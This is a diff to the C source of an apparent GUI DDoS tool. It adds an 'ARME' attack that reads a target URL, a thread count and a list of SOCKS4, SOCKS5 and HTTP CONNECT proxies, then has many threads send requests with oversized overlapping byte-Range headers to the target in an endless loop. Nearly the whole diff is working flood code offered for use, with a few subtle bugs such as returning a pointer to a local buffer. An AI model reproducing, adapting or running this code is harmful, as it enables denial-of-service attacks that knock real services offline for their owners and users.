@@ -101,13 +101,15 @@ struct list *head = NULL;
 char parseError[128];
 char *ipstr;
 
+static int rps = 0;
+
 GtkWidget *ddos_text_view;
 GtkWidget *main_win;
 
 int parseURL(char *url, struct urlparts **returnpart);
 
 /** RUDY DDOS **/
-void rudy_ddos()
+void rudy_ddos(void)
 {
     GtkWidget *target_url = NULL;
     GtkWidget *scrape_dialog = NULL;
@@ -919,7 +921,7 @@ END:
     for(i = 0; i < atoi(threads_number_string); i++)
         pthread_cancel(thread[i]);
 
-	return 0;
+	return;
 }
 
 char *geturl(char *url, char *useragent, char *ip)
@@ -1396,4 +1398,405 @@ int fnAttackInformation(int attackID)
 	close(sock);
 
 	return 0;
+}
+
+
+/** ARME DDOS **/
+void cb_arme_ddos(void)
+{
+    GtkWidget *target_url = NULL;
+    GtkWidget *method_dialog = NULL;
+    GtkWidget *number_threads_dialog = NULL;
+    GtkWidget *proxy_list_dialog = NULL;
+    GtkWidget *time_dialog = NULL;
+
+    GtkWidget *get_arg_entry_1 = NULL;
+    GtkWidget *get_arg_entry_2 = NULL;
+    GtkWidget *get_arg_entry_3 = NULL;
+    GtkWidget *get_arg_entry_4 = NULL;
+    GtkWidget *get_arg_entry_5 = NULL;
+
+    const gchar *target = NULL;
+    const gchar *method_string = NULL;
+    const gchar *threads_number_string = NULL;
+    const gchar *proxy_string = NULL;
+    const gchar *time_duration = NULL;
+
+    GtkTextBuffer *text_buffer = NULL;
+    gchar *text = NULL;
+    GtkTextIter start;
+    GtkTextIter end;
+
+
+    /* Obtaining the buffer associated with the widget. */
+    text_buffer = gtk_text_view_get_buffer(GTK_TEXT_VIEW(ddos_text_view));
+
+    /** Set the default buffer text. **/
+    gtk_text_buffer_set_text(text_buffer, "Usage : <target url> <method (GET or HEAD or POST)> <threads number> <proxy list> <time>", -1);
+
+    /** Obtain iters for the start and end of points of the buffer **/
+    gtk_text_buffer_get_start_iter(text_buffer, &start);
+    gtk_text_buffer_get_end_iter(text_buffer, &end);
+
+    /** Get the entire buffer text. **/
+    text = gtk_text_buffer_get_text(text_buffer, &start, &end, FALSE);
+
+    /** Print the text **/
+    g_print("%s", text);
+
+    g_free(text);
+
+    target_url = gtk_dialog_new_with_buttons("Enter target URL", GTK_WINDOW(main_win),  GTK_DIALOG_MODAL, GTK_STOCK_APPLY, GTK_RESPONSE_APPLY, NULL);
+    method_dialog = gtk_dialog_new_with_buttons("Enter method (GET or HEAD or POST)", GTK_WINDOW(main_win),  GTK_DIALOG_MODAL, GTK_STOCK_APPLY, GTK_RESPONSE_APPLY, NULL);
+    number_threads_dialog = gtk_dialog_new_with_buttons("Enter numbers of threads", GTK_WINDOW(main_win),  GTK_DIALOG_MODAL, GTK_STOCK_APPLY, GTK_RESPONSE_APPLY, NULL);
+    proxy_list_dialog = gtk_dialog_new_with_buttons("Enter proxy list file", GTK_WINDOW(main_win),  GTK_DIALOG_MODAL, GTK_STOCK_APPLY, GTK_RESPONSE_APPLY, NULL);
+    time_dialog = gtk_dialog_new_with_buttons("Enter Time", GTK_WINDOW(main_win),  GTK_DIALOG_MODAL, GTK_STOCK_APPLY, GTK_RESPONSE_APPLY, NULL);
+
+    gtk_widget_set_size_request(target_url, 360, 100);
+    gtk_widget_set_size_request(method_dialog, 360, 100);
+    gtk_widget_set_size_request(number_threads_dialog, 360, 100);
+    gtk_widget_set_size_request(proxy_list_dialog, 360, 100);
+    gtk_widget_set_size_request(time_dialog, 360, 100);
+
+    get_arg_entry_1 = gtk_entry_new();
+    get_arg_entry_2 = gtk_entry_new();
+    get_arg_entry_3 = gtk_entry_new();
+    get_arg_entry_4 = gtk_entry_new();
+    get_arg_entry_5 = gtk_entry_new();
+
+    gtk_box_pack_start(GTK_BOX(GTK_DIALOG(target_url)->vbox), get_arg_entry_1, TRUE, FALSE, 0);
+    gtk_box_pack_start(GTK_BOX(GTK_DIALOG(method_dialog)->vbox), get_arg_entry_2, TRUE, FALSE, 0);
+    gtk_box_pack_start(GTK_BOX(GTK_DIALOG(number_threads_dialog)->vbox), get_arg_entry_3, TRUE, FALSE, 0);
+    gtk_box_pack_start(GTK_BOX(GTK_DIALOG(proxy_list_dialog)->vbox), get_arg_entry_4, TRUE, FALSE, 0);
+    gtk_box_pack_start(GTK_BOX(GTK_DIALOG(time_dialog)->vbox), get_arg_entry_5, TRUE, FALSE, 0);
+
+    gtk_widget_show_all(GTK_DIALOG(target_url)->vbox);
+    switch(gtk_dialog_run(GTK_DIALOG(target_url)))
+    {
+        case GTK_RESPONSE_APPLY:
+            target = gtk_entry_get_text(GTK_ENTRY(get_arg_entry_1));
+            gtk_widget_hide(target_url);
+            break;
+
+        default:
+            gtk_widget_hide(target_url);
+            break;
+    }
+
+    gtk_widget_show_all(GTK_DIALOG(method_dialog)->vbox);
+    switch(gtk_dialog_run(GTK_DIALOG(method_dialog)))
+    {
+        case GTK_RESPONSE_APPLY:
+            method_string = gtk_entry_get_text(GTK_ENTRY(get_arg_entry_2));
+            gtk_widget_hide(method_dialog);
+            break;
+
+        default:
+            gtk_widget_hide(method_dialog);
+            break;
+    }
+
+    gtk_widget_show_all(GTK_DIALOG(number_threads_dialog)->vbox);
+    switch(gtk_dialog_run(GTK_DIALOG(number_threads_dialog)))
+    {
+        case GTK_RESPONSE_APPLY:
+            threads_number_string = gtk_entry_get_text(GTK_ENTRY(get_arg_entry_3));
+            gtk_widget_hide(number_threads_dialog);
+            break;
+
+        default:
+            gtk_widget_hide(number_threads_dialog);
+            break;
+    }
+
+    gtk_widget_show_all(GTK_DIALOG(proxy_list_dialog)->vbox);
+    switch(gtk_dialog_run(GTK_DIALOG(proxy_list_dialog)))
+    {
+        case GTK_RESPONSE_APPLY:
+            proxy_string = gtk_entry_get_text(GTK_ENTRY(get_arg_entry_4));
+            gtk_widget_hide(proxy_list_dialog);
+            break;
+
+        default:
+            gtk_widget_hide(proxy_list_dialog);
+            break;
+    }
+
+    gtk_widget_show_all(GTK_DIALOG(time_dialog)->vbox);
+    switch(gtk_dialog_run(GTK_DIALOG(time_dialog)))
+    {
+        case GTK_RESPONSE_APPLY:
+            time_duration = gtk_entry_get_text(GTK_ENTRY(get_arg_entry_5));
+            gtk_widget_hide(time_dialog);
+            break;
+
+        default:
+            gtk_widget_destroy(target_url);
+            gtk_widget_destroy(method_dialog);
+            gtk_widget_destroy(number_threads_dialog);
+            gtk_widget_destroy(proxy_list_dialog);
+            gtk_widget_destroy(time_dialog);
+            return;
+    }
+
+    printf("target url = %s\n", target);
+    printf("method settings = %s\n", method_string);
+    printf("threads number = %s\n", threads_number_string);
+    printf("poxy list file = %s\n", proxy_string);
+    printf("time = %s\n", time_duration);
+
+
+	int num_threads = atoi(threads_number_string);
+	char *method = method_string;
+
+
+	FILE *pFile = fopen(proxy_string, "rb");
+	if(pFile==NULL)
+	{
+		perror("fopen"); exit(1);
+	}
+
+	fseek(pFile, 0, SEEK_END);
+	long lSize = ftell(pFile);
+	rewind(pFile);
+
+	char *buffer = (char *)malloc(lSize*sizeof(char));
+	fread(buffer, 1, lSize, pFile);
+	fclose (pFile);
+
+	int i=0;
+
+	char *pch = (char *)strtok(buffer, ":");
+	while(pch != NULL)
+	{
+		if(head == NULL)
+		{
+			head = (struct list *)malloc(sizeof(struct list));
+			bzero(head, sizeof(struct list));
+			head->data = (struct proxy *)malloc(sizeof(struct proxy));
+			bzero(head->data, sizeof(struct proxy));
+			head->data->working = 1;
+			head->data->ip = malloc(strlen(pch)+1); strcpy(head->data->ip, pch);
+			pch = (char *)strtok(NULL, ":");
+			if(pch == NULL) exit(-1);
+			head->data->port = atoi(pch);
+			pch = (char *)strtok(NULL, ":");
+			head->data->type = malloc(strlen(pch)+1); strcpy(head->data->type, pch);
+			pch = (char *)strtok(NULL, ":");
+			head->useragent = useragents[rand() % (sizeof(useragents)/sizeof(char *))];
+			head->next = head;
+			head->prev = head;
+		} else {
+			struct list *new_node = (struct list *)malloc(sizeof(struct list));
+			bzero(new_node, sizeof(struct list));
+			new_node->data = (struct proxy *)malloc(sizeof(struct proxy));
+			bzero(new_node->data, sizeof(struct proxy));
+			new_node->data->working = 1;
+			new_node->data->ip = malloc(strlen(pch)+1); strcpy(new_node->data->ip, pch);
+			pch = (char *)strtok(NULL, ":");
+			if(pch == NULL) break;
+			new_node->data->port = atoi(pch);
+			pch = (char *)strtok(NULL, ":");
+			new_node->data->type = malloc(strlen(pch)+1); strcpy(new_node->data->type, pch);
+			pch = (char *)strtok(NULL, ":");
+			new_node->useragent = useragents[rand() % (sizeof(useragents)/sizeof(char *))];
+			new_node->prev = head;
+			new_node->next = head->next;
+			head->next = new_node;
+		}
+	}
+	free(buffer);
+	const rlim_t kOpenFD = 1024 + (num_threads * 2);
+	struct rlimit rl;
+	int result;
+	rl.rlim_cur = kOpenFD;
+	rl.rlim_max = kOpenFD;
+	result = setrlimit(RLIMIT_NOFILE, &rl);
+	if (result != 0)
+	{
+		perror("setrlimit");
+		fprintf(stderr, "setrlimit returned result = %d\n", result);
+	}
+	bzero(&rl, sizeof(struct rlimit));
+	rl.rlim_cur = 256 * 1024;
+	rl.rlim_max = 4096 * 1024;
+	result = setrlimit(RLIMIT_STACK, &rl);
+	if (result != 0)
+	{
+		perror("setrlimit_stack");
+		fprintf(stderr, "setrlimit_stack returned result = %d\n", result);
+	}
+	setupparts();
+	parseURL(target, returnparts);
+
+    struct hostent *he;
+    struct in_addr a;
+    he = gethostbyname(returnparts[host]->value);
+    if (he)
+    {
+        while (*he->h_addr_list)
+        {
+            bcopy(*he->h_addr_list++, (char *) &a, sizeof(a));
+            ipstr = malloc(INET_ADDRSTRLEN+1);
+            inet_ntop (AF_INET, &a, ipstr, INET_ADDRSTRLEN);
+            break;
+        }
+    }
+    else
+    { herror("gethostbyname"); }
+
+
+	char *postdata = malloc(1);
+	bzero(postdata, 1);
+	char *extrahead = malloc(1);
+	bzero(extrahead, 1);
+
+	pthread_t thread[num_threads];
+	postpayload = malloc(12001);
+	sprintf(postpayload, postformat, returnparts[host]->value, useragents[rand() % 40], fznGenerateRange());
+	freeparts();
+
+	//printf("Packet -> \n%s\n", postpayload);
+
+	//return 0;
+
+	//fprintf(stdout, "Starting Flood...\n");
+
+	//fnAttackInformation(atoi(argv[argc-1]));
+
+	for(i = 0;i<num_threads;i++){
+		pthread_create(&thread[i], NULL, &flood_arme, (void *)head);
+		pthread_detach(thread[i]);
+		head = head->next;
+	}
+
+	//int temp = atoi(argv[5]);
+
+	wait_time_end(atoi(time_duration));
+
+    for(i = 0; i < atoi(threads_number_string); i++)
+        pthread_cancel(thread[i]);
+
+	return;
+}
+
+
+char *fznGenerateRange()
+{
+	char szBytes[12000] = "0-";
+	char szAdd[12];
+	for (int i = 0; i <= 1299; i++)
+	{
+		sprintf(szAdd, ",5-%d", i);
+		strcat(szBytes, szAdd);
+		bzero(szAdd, 12);
+	}
+
+	return szBytes;
+}
+
+void *flood_arme(void *par)
+{
+	struct list *startpoint = (struct list *)par;
+	int i;
+	struct sockaddr_in serverAddr;
+	signal(SIGPIPE, SIG_IGN);
+	while(1)
+	{
+		int sent = 0;
+		if(startpoint->data->working == 0)
+		{
+			startpoint = startpoint->next;
+			usleep(10000);
+			continue;
+		}
+
+		memset(&serverAddr, 0, sizeof(serverAddr));
+		serverAddr.sin_family = AF_INET;
+		serverAddr.sin_port = htons(startpoint->data->port);
+		serverAddr.sin_addr.s_addr = inet_addr(startpoint->data->ip);
+		int serverSocket = socket(PF_INET, SOCK_STREAM, IPPROTO_TCP);
+		u_int yes=1;
+		if (setsockopt(serverSocket,SOL_SOCKET,SO_REUSEADDR,&yes,sizeof(yes)) < 0) {}
+		if(connect(serverSocket, (struct sockaddr *)&serverAddr, sizeof(serverAddr)) > 0)
+		{
+			startpoint->data->working = 0;
+			startpoint = startpoint->next;
+			continue;
+		}
+		if(strcmp(startpoint->data->type, "Socks4")==0)
+		{
+			unsigned char buf[10];
+			buf[0] = 0x04;
+			buf[1] = 0x01;
+			*(unsigned short*)&buf[2] = htons(ATTACKPORT);
+			*(unsigned long*)&buf[4] = inet_addr(ipstr);
+			buf[8] = 0x00;
+			if(send(serverSocket, buf, 9, MSG_NOSIGNAL) != 9)
+			{
+				startpoint->data->working = 0;
+				startpoint = startpoint->next;
+				close(serverSocket);
+				continue;
+			}
+		}
+		if(strcmp(startpoint->data->type, "Socks5")==0)
+		{
+			unsigned char buf[20];
+			buf[0] = 0x05;
+			buf[1] = 0x01;
+			buf[2] = 0x00;
+			if((sent = send(serverSocket, buf, 3, MSG_NOSIGNAL)) < 0)
+			{
+				startpoint->data->working = 0;
+				startpoint = startpoint->next;
+				close(serverSocket);
+				continue;
+			}
+			buf[0] = 0x05;
+			buf[1] = 0x01;
+			buf[2] = 0x00;
+			buf[3] = 0x01;
+			*(unsigned long*)&buf[4] = inet_addr(ipstr);
+			*(unsigned short*)&buf[8] = htons(ATTACKPORT);
+			if((sent = send(serverSocket, buf, 10, MSG_NOSIGNAL)) < 0)
+			{
+				startpoint->data->working = 0;
+				startpoint = startpoint->next;
+				close(serverSocket);
+				continue;
+			}
+		}
+		if(strcmp(startpoint->data->type, "CONNECT") == 0 || strcmp(startpoint->data->type, "TUNNEL") == 0)
+		{
+			char *connectrequest = malloc(1024);
+			bzero(connectrequest, 1024);
+			sprintf(connectrequest, "CONNECT %s:25565 HTTP/1.0\r\n\r\n", ipstr);
+			if((sent = send(serverSocket, connectrequest, strlen(connectrequest), MSG_NOSIGNAL)) < 0)
+			{
+				startpoint->data->working = 0;
+				startpoint = startpoint->next;
+				close(serverSocket);
+				continue;
+			}
+			char *recvbuf = malloc(1024);
+			bzero(recvbuf, 1024);
+			int gotbytes = recv(serverSocket, recvbuf, 1024, 0);
+			if(gotbytes < 1)
+			{
+				startpoint->data->working = 0;
+				startpoint = startpoint->next;
+				close(serverSocket);
+				continue;
+			}
+			free(recvbuf);
+		}
+
+		send(serverSocket, postpayload, strlen(postpayload), MSG_NOSIGNAL);
+		//free(httppayload);
+		close(serverSocket);
+		rps++;
+		usleep(50000);
+		//startpoint = startpoint->next;
+	}
 }
